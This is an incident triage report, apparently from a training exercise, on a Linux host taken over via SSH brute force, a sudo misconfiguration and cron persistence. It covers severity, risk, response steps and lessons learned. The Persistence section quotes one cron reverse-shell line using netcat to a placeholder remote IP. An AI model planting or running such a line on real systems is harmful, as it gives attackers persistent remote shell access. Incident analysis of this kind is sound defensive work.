# Incident Triage

## Incident Overview

This phase evaluates the severity, impact, and confidence level of the detected compromise.

The investigation determined that the system was successfully compromised and administrative access was obtained.

---

# Executive Summary

A Linux host was compromised through an SSH credential attack.

The attacker successfully authenticated using a compromised user account, escalated privileges to root, accessed sensitive files, simulated data exfiltration, and established persistence through a scheduled cron task.

Immediate containment actions were required to prevent continued unauthorized access.

---

# Technical Summary

## Initial Access

The attacker performed SSH brute-force activity and successfully obtained access through the account:

```
auditor
```

Evidence:

```
ssh.log
journalctl
```

---

## Privilege Escalation

The attacker identified a sudo misconfiguration allowing execution of:

```
/usr/bin/ssh-agent
```

This was abused to obtain root privileges.

Evidence:

```
processes.txt
```

---

## Persistence

The attacker created a cron-based reverse shell:

```
* * * * * nc -e /bin/sh <remote-ip> 12345
```

Evidence:

```
root_cron.txt
```

---

## Data Exposure

The attacker accessed:

```
/root/sensitive-data.7z
```

and simulated exfiltration using Netcat.

Evidence:

```
PCAP
process logs
```

---

# Incident Classification

| Category | Assessment |
|-|-|
| Severity | Critical |
| Affected Asset | Linux host |
| Compromise Level | Full system compromise |
| Privilege Level Obtained | Root |
| Data Exposure | Confirmed |
| Persistence | Confirmed |
| Confidence | High |

---

# Risk Assessment

The attacker achieved complete control of the system.

Potential impact:

- Unauthorized data access
- Continued remote access
- Additional malware installation
- Credential theft
- Lateral movement opportunities

---

# Incident Response Priority

Priority actions:

1. Remove attacker persistence.
2. Terminate malicious sessions.
3. Disable compromised accounts.
4. Validate system integrity.
5. Restore normal operations.

---

# Lessons Learned

## Detection Gaps

Identified weaknesses:

- Limited command execution visibility.
- No centralized log aggregation.
- Missing audit telemetry.

---

## What Worked

Successful investigation sources:

- Packet capture
- SSH logs
- Process snapshots
- Cron inspection
- Manual timeline reconstruction

---

## Future Improvements

Recommended improvements:

- Implement SIEM logging.
- Deploy endpoint monitoring.
- Add auditd rules.
- Create automated detection rules.